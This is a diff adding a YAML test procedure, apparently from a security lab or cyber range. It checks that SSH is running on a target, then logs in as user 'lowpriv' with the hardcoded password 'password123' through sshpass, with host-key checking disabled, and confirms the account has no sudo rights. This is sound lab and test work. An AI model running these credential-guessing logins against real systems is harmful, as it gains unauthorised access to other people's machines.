@@ -1,0 +1,31 @@
+procedure:
+- action:
+    command: service ssh status || service sshd status || pgrep -a sshd
+    type: exec_target
+  expect:
+    exit_code: 0
+  outputs: {}
+  session: null
+  step_id: verify_ssh_running
+  timeout: 10
+- action:
+    command: sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      lowpriv@${target_host} 'id && whoami && hostname'
+    type: exec_attacker
+  expect:
+    stdout_contains: uid=1001(lowpriv)
+  outputs: {}
+  session: null
+  step_id: exploit_weak_credentials
+  timeout: 30
+- action:
+    command: sshpass -p 'password123' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10
+      lowpriv@${target_host} 'id'
+    type: exec_attacker
+  expect:
+    stdout_regex: uid=1001\(lowpriv\) gid=1001\(lowpriv\) groups=1001\(lowpriv\)
+  outputs: {}
+  session: null
+  step_id: verify_no_sudo
+  timeout: 30
+sessions: []
